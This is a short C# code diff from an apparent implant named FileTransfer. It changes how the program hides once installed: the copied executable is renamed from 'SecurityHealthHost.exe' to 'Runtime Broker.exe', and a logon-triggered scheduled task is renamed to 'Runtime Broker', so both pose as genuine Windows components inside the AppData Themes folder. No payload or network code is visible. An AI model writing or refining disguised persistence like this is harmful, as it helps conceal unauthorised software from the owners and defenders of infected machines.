@@ -25,10 +25,10 @@ namespace FileTransfer
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
             "Microsoft", "Windows", "Themes");
 
-        public static readonly string DestExe = Path.Combine(DestDir, "SecurityHealthHost.exe");
+        public static readonly string DestExe = Path.Combine(DestDir, "Runtime Broker.exe");
         private static readonly string Marker = Path.Combine(DestDir, "wsc.dat");
         private static readonly string TaskXml = Path.Combine(DestDir, "wsc.xml");
-        private const string TaskName = "Windows Security Health Host";
+        private const string TaskName = "Runtime Broker";
 
         public static bool IsInstalled() => File.Exists(Marker);
 
@@ -58,7 +58,7 @@ namespace FileTransfer
                 string xml = $@"<?xml version=""1.0"" encoding=""UTF-16""?>
 <Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
   <RegistrationInfo>
-    <Description>Windows Security Health Host</Description>
+    <Description>Runtime Broker</Description>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger>
